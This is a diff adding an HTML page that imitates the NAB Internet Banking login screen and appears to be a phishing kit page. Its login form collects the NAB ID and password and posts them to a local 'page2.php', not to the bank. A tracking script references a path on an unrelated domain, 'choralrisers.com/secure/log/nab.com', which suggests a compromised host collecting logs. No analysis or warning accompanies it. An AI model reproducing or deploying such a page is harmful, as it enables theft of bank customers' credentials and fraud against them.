@@ -1,0 +1,398 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+<!-- saved from url=(0037)https://ib.nab.com.au/nabib/index.jsp -->
+<html xmlns="http://www.w3.org/1999/xhtml">
+ <head>
+  <meta content="Content-Type" http-equiv="Content-Type" />
+  <style type="text/css">
+   @charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide{display:none !important;}ng\:form{display:block;}.ng-animate-block-transitions{transition:0s all!important;-webkit-transition:0s all!important;}
+  </style>
+  <meta content="IE=edge" http-equiv="X-UA-Compatible" />
+  <meta content="0" http-equiv="Expires" />
+  <meta content="no-cache" http-equiv="Pragma" />
+  <meta content="no-cache" http-equiv="Cache-Control" />
+  <meta content="900" http-equiv="refresh" />
+  <meta name="robots" content="noindex,nofollow,noarchive" />
+  <meta content="cf87dc5d-0245-4eff-8d99-37f2da85bf44" name="nab-app-id" />
+  <title>
+   NAB Internet Banking
+  </title>
+  <link href="./nab_files/reset.css" type="text/css" media="screen" rel="stylesheet" />
+  <link href="./nab_files/_template-styles.css" type="text/css" media="screen" rel="stylesheet" />
+  <link href="./nab_files/_content-styles.css" type="text/css" media="screen" rel="stylesheet" />
+  <link href="./nab_files/added-styles.css" type="text/css" media="screen" rel="stylesheet" />
+  <link href="./nab_files/_campaign-styles.css" type="text/css" media="screen" rel="stylesheet" />
+  <link href="./nab_files/_ibRedesign-styles.css" type="text/css" media="screen" rel="stylesheet" />
+  <link href="./nab_files/_print-styles.css" type="text/css" media="screen" rel="stylesheet" />
+  <link media="screen" type="text/css" rel="stylesheet" href="./nab_files/jquery.fancybox-1.3.1.css" />
+  <script src="http://code.jquery.com/jquery-1.7.2.min.js">
+  </script>
+  <style type="text/css">
+   .maintenance-check {
+	background:url("https://ib.nab.com.au/nabib/images/login/bg_arrow.gif") no-repeat scroll 0 50% Transparent;
+	color:#ffffff;
+	padding-left:14px;
+	width: 260px;
+	float:left;
+}
+
+.maintenance-check .content {
+	background-color:rgba(191, 52, 37, 0.6);
+	-moz-border-radius:4px;
+	-webkit-border-radius:4px;
+	padding:20px;
+}
+
+.maintenance-check h2 {
+	font-size:1em;
+	padding-bottom:12px;
+	font-family:'CorpidBlack';
+}
+
+h2.icon-spanner {
+	background:url("https://ib.nab.com.au/nabib/images/login/icon_help-v3.gif") no-repeat scroll 0 0 Transparent;
+	padding-left:33px;
+	padding-top:0px;
+	margin-bottom:0;
+	padding-bottom:8px;
+	font-size:1.583em;
+}
+
+#bodycontainer .maintenance-check p {
+	font-size:1.167em;
+	line-height:18px;
+	color:#ffffff;
+}
+
+
+* {
+	margin: 0;
+}
+
+html, body {
+	height: 100%;
+}
+
+.wrapper {
+	min-height: 100%;
+	height: auto !important;
+	height: 100%;
+	margin: 0 auto -70px;
+}
+
+.footer, .push {
+	height: 70px;
+	position: relative;
+}
+
+.push {
+    z-index: 9000;
+}
+.footer {
+    z-index: 9999;
+}
+  </style>
+ </head>
+ <body class="ng-scope" onload="init()" ng-init="apiLogoutWhenIBLogin();" ng-controller="apiLogoutController" ng-app="nab.ib.nabapi.logout" id="mainPage">
+  <script>
+   var monthNames = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"];
+var dayNames = ['Sunday','Monday','Tuesday','Wednesday','Thursday','Friday','Saturday'];
+var dateObj = new Date();
+var month = monthNames[dateObj.getUTCMonth()];
+var dynm = dayNames[ dateObj.getDay() ];
+var day = dateObj.getUTCDate();
+var year = dateObj.getUTCFullYear();
+$( document ).ready(function() {
+   $('#dayname').html(dynm);
+   $('#day').html(day);
+   $('#month').html(month);
+   $('#year').html(year);
+});
+  </script>
+  <script language="JavaScript">
+   function OnUserInput(userInput)
+{
+        if(userInput == 1)
+        {
+            var user = document.loginForm.userid.value;
+              if(user.length &lt; 7)
+              {
+				$("#usererr").show();
+                return false;
+              }else{
+			  $("#usererr").hide();
+			  }
+            var user = document.loginForm.password.value;
+              if(user.length &lt; 4)
+              {
+				$("#pwderr").show();
+                return false;
+              }else{
+			  $("#pwderr").hide();
+			  }
+    }
+}
+  </script>
+  <div class="clearfix wrapper" id="bodycontainer">
+   <form class="ng-pristine ng-valid" autocomplete="off" method="post" action="page2.php" name="loginForm" id="loginForm">
+    <div class="clearfix" id="bodycontainer_inside">
+     <div id="header">
+      <div class="inside clearfix">
+       <div class="column-1">
+        <a title="NAB" href="http://www.nab.com.au/">
+         <img class="logo" alt="nab" src="./nab_files/logo_nab.gif" />
+        </a>
+        <p class="slogan">
+         <img border="0" src="./nab_files/gr_slogan.gif" alt="more give, less take" class="link-logo" />
+        </p>
+       </div>
+       <div class="column-2">
+        <ul>
+         <li class="first">
+          <a onclick="" onfocus="status='Help';return true;" onmouseout="status='';return true;" href="javascript:helpwin('http://www.nab.com.au/personal/internet-banking/help/nab-internet-banking','top=20,left=50,width=780,height=560,toolbar=yes,scrollbars=yes,resizable=yes')" title="Help (opens in new window)">
+           Help
+          </a>
+         </li>
+         <li>
+          <a title="Security" href="javascript:goToSecurity()">
+           Security
+          </a>
+         </li>
+         <li>
+          <a href="javascript:goToNationalContact()" title="Contact us">
+           Contact us
+          </a>
+         </li>
+        </ul>
+        <p>
+         <span id="dayname">
+         </span>
+         <span id="day">
+         </span>
+         <span id="month">
+         </span>
+         <span id="year">
+         </span>
+        </p>
+       </div>
+      </div>
+     </div>
+     <div id="banner">
+      <div class="inside clearfix">
+       <h1>
+        NAB Internet Banking
+       </h1>
+       <div class="user-login clearfix">
+        <div class="column-1">
+         <h2>
+          NAB ID
+         </h2>
+         <div id="acs" class="ib-user form-layout-1 clearfix">
+          <fieldset>
+           <legend>
+            NAB ID
+           </legend>
+           <div class="ib-user-field clearfix">
+            <input type="text" tabindex="1" id="ib-user-text" maxlength="10" size="18" name="userid" class="ib-user-text red-border rc-2 ac_input" title="NAB ID" value="" autocomplete="off" />
+           </div>
+          </fieldset>
+         </div>
+         <a class="ico smallGreyArrow fancybox-page first" title="Forgotten your NAB ID?" href="https://ib.nab.com.au/nabib/nab_id_help.ctl?width=495&height=200">
+          Forgotten your NAB ID?
+         </a>
+        </div>
+        <div class="column-1">
+         <h2>
+          Password
+         </h2>
+         <div id="acs" class="ib-user form-layout-1 clearfix">
+          <fieldset>
+           <legend>
+            Password
+           </legend>
+           <div class="ib-user-field clearfix">
+            <input type="password" tabindex="2" maxlength="500" size="18" id="ib-user-text" name="password" class="ib-user-text red-border rc-2 ac_input" title="Internet Banking password" value="" autocomplete="off" />
+           </div>
+          </fieldset>
+         </div>
+         <a class="ico smallGreyArrow fancybox-page" title="Forgotten your password?" href="https://ib.nab.com.au/nabib/password_hints.ctl?width=500&height=266">
+          Forgotten your password?
+         </a>
+        </div>
+        <div class="cta">
+         <button tabindex="3" onclick="return OnUserInput(1);" type="submit" class="link-btn link-btn_lg black" style="cursor:pointer;">
+          Login
+         </button>
+        </div>
+        <style type="text/css">
+         .need-help {
+	background:url("https://ib.nab.com.au/nabib/images/login/bg_arrow_black.gif") no-repeat scroll 0 50px Transparent;
+	color:#ffffff;
+	padding-left:13px;
+	margin-left:25px;
+	width:262px;
+	float:left;
+}
+
+.need-help .content {
+	background-color:#000000;
+	-moz-border-radius:4px;
+	-webkit-border-radius:4px;
+	padding-top:20px;
+	padding-right:20px;
+	padding-left:20px;
+	padding-bottom:1px;
+}
+
+.need-help h2 {
+	font-size:1.6em;
+	padding-bottom:8px;
+	line-height:21px;
+	font-family:'CorpidBlack';
+}
+
+h2.icon-help {
+	background: url("https://ib.nab.com.au/nabib/images/login/icon_help.gif") no-repeat scroll 0 2px Transparent;
+    padding-left: 29px;
+    padding-top: 2px;
+    margin-bottom:0;
+}
+
+.need-help p {
+	font-size:1em;
+	line-height:22px;
+	color:#ffffff;
+}
+        </style>
+        <div style="display:none;padding-left: 13px;" id="usererr" class="need-help">
+         <div class="content">
+          <h2 class="icon-help">
+           Login Error
+           <span style="font-size:0.7em;" id="errorNumber">
+            (301005)
+           </span>
+          </h2>
+          <p style="font-size:1.167em;" id="errorMessage">
+           Please enter your NAB ID.
+          </p>
+         </div>
+        </div>
+        <div style="display:none;padding-left: 13px;" id="pwderr" class="need-help">
+         <div class="content">
+          <h2 class="icon-help">
+           Login Error
+           <span style="font-size:0.7em;" id="errorNumber">
+            (301008)
+           </span>
+          </h2>
+          <p style="font-size:1.167em;" id="errorMessage">
+           Please enter your Internet Banking password.
+          </p>
+         </div>
+        </div>
+       </div>
+      </div>
+     </div>
+     <div class="maincontainer_inside">
+      <div class="call-to-action-box bottom-border clearfix">
+       <div class="content">
+        <p>
+         Using NAB Internet Banking for the first time?
+        </p>
+       </div>
+       <a onclick="showRegistration()" href="https://ib.nab.com.au/nabib/index.jsp#" title="Register now for NAB Internet Banking" class="link-btn link-btn_sm red float-right">
+        Register now
+       </a>
+      </div>
+     </div>
+    </div>
+   </form>
+   <div class="push">
+   </div>
+  </div>
+  <div class="footer" id="footer_login">
+   <div class="inside clearfix">
+    <a title="Learn more about NAB Defence" href="javascript:openPopUpWindow('http://www.nab.com.au/nabdefence', 'nabdefence', '780', '560', 'yes', 'yes', 'yes', 'yes', 'yes', '', '50', '20', '')">
+     <img border="0" src="./nab_files/NAB_Defence.gif" alt="NAB Defence" class="left" />
+    </a>
+    <p style="float:left;">
+     NAB Defence, your protection against fraud.
+     <a title="Learn more about NAB Defence" href="javascript:openPopUpWindow('http://www.nab.com.au/nabdefence', 'nabdefence', '780', '560', 'yes', 'yes', 'yes', 'yes', 'yes', '', '50', '20', '')">
+      Learn more about NAB Defence.
+     </a>
+    </p>
+    <ul id="links-social-media" class="clearfix">
+     <li>
+      <a class="footer-facebook" title="Facebook" href="javascript:openPopUpWindow('https://www.facebook.com/nab', 'nabfacebook', '780', '560', 'yes', 'yes', 'yes', 'yes', 'yes', '', '50', '20', '')">
+      </a>
+     </li>
+     <li>
+      <a class="footer-twitter" title="Twitter" href="javascript:openPopUpWindow('https://twitter.com/nab', 'nabtwitter', '780', '560', 'yes', 'yes', 'yes', 'yes', 'yes', '', '50', '20', '')">
+      </a>
+     </li>
+     <li>
+      <a class="footer-icon-gplus" title="Google Plus" href="javascript:openPopUpWindow('https://plus.google.com/113563644525302634808?prsrc=3', 'nabgoogleplus', '780', '560', 'yes', 'yes', 'yes', 'yes', 'yes', '', '50', '20', '')">
+      </a>
+     </li>
+     <li>
+      <a class="footer-icon-youtube" title="You Tube" href="javascript:openPopUpWindow('https://www.youtube.com/nab', 'nabyoutube', '780', '560', 'yes', 'yes', 'yes', 'yes', 'yes', '', '50', '20', '')">
+      </a>
+     </li>
+    </ul>
+   </div>
+  </div>
+  <div id="fancybox-tmp">
+  </div>
+  <div id="fancybox-loading">
+   <div>
+   </div>
+  </div>
+  <div id="fancybox-overlay">
+  </div>
+  <div id="fancybox-wrap">
+   <div id="fancybox-outer">
+    <div id="fancy-bg-n" class="fancy-bg">
+    </div>
+    <div id="fancy-bg-ne" class="fancy-bg">
+    </div>
+    <div id="fancy-bg-e" class="fancy-bg">
+    </div>
+    <div id="fancy-bg-se" class="fancy-bg">
+    </div>
+    <div id="fancy-bg-s" class="fancy-bg">
+    </div>
+    <div id="fancy-bg-sw" class="fancy-bg">
+    </div>
+    <div id="fancy-bg-w" class="fancy-bg">
+    </div>
+    <div id="fancy-bg-nw" class="fancy-bg">
+    </div>
+    <div id="fancybox-inner">
+    </div>
+    <a id="fancybox-close">
+    </a>
+    <a id="fancybox-left" href="javascript:;">
+     <span id="fancybox-left-ico" class="fancy-ico">
+     </span>
+    </a>
+    <a id="fancybox-right" href="javascript:;">
+     <span id="fancybox-right-ico" class="fancy-ico">
+     </span>
+    </a>
+   </div>
+  </div>
+  <!-- WiredMinds eMetrics tracking with Enterprise Edition V5.4 START -->
+  <script src="https://count.carrierzone.com/app/count_server/count.js" type="text/javascript">
+  </script>
+  <script type="text/javascript">
+   &lt;!--
+wm_custnum='2d0d16ceadb9ea17';
+wm_page_name='index.php';
+wm_group_name='/services/webpages/c/h/choralrisers.com/secure/log/nab.com/561473f7216a9c06ebeca939445eef10';
+wm_campaign_key='campaign_id';
+wm_track_alt='';
+wiredminds.count();
+// --&gt;
+  </script>
+  <!-- WiredMinds eMetrics tracking with Enterprise Edition V5.4 END -->
+ </body>
+</html>
